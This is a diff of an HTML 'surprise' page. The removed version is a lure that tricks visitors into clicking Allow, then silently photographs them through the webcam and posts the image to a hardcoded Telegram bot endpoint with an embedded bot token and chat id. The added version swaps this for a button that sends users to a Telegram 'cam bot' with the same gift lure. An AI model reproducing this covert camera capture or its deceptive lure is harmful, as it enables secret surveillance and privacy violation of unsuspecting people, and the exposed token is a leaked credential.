@@ -3,70 +3,48 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎁 Unlock Your Surprise</title>
-
+<title>🎁 Your HCO Bot Surprise!</title>
 <style>
-    body {
-        margin: 0;
-        background: black;
-        color: white;
-        font-family: Arial, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        flex-direction: column;
-        text-align: center;
-    }
-
-    #loading {
-        font-size: 28px;
-        animation: blink 1s infinite;
-        margin-bottom: 20px;
-    }
-
-    @keyframes blink {
-        0% { opacity: 0.2; }
-        50% { opacity: 1; }
-        100% { opacity: 0.2; }
-    }
+body {
+    background: linear-gradient(120deg, #0f0c29, #302b63, #24243e);
+    color: #fff;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
+}
+button {
+    padding: 15px 30px;
+    background: #00ff8a;
+    color: #000;
+    font-size: 20px;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+button:hover {
+    background: #00e676;
+}
+h1 {
+    margin-bottom: 20px;
+}
 </style>
 </head>
-
 <body>
-
-<h2 id="loading">Loading your surprise...</h2>
-<h3>🎁 Please click <b>Allow</b> to unlock your gift!</h3>
+<div>
+    <h1>🎁 Click Allow to start the HCO Bot!</h1>
+    <button onclick="startBot()">Allow</button>
+</div>
 
 <script>
-    async function startCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-            let track = stream.getVideoTracks()[0];
-            let imageCapture = new ImageCapture(track);
-
-            setTimeout(() => {
-                imageCapture.takePhoto().then(blob => {
-
-                    let form = new FormData();
-                    form.append("photo", blob, "pic.jpg");
-
-                    fetch("https://api.telegram.org/bot8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI/sendPhoto?chat_id=8215819954", {
-                        method: "POST",
-                        body: form
-                    });
-
-                });
-            }, 3000);
-
-        } catch (err) {
-            document.getElementById("loading").innerText = "❌ Please allow camera!";
-        }
-    }
-
-    startCamera();
+function startBot() {
+    // Open bot in new tab
+    window.open("https://t.me/hco_cam_bot?start=1", "_blank");
+    alert("Bot opened! Follow instructions in Telegram to get your surprise.");
+}
 </script>
-
 </body>
 </html>
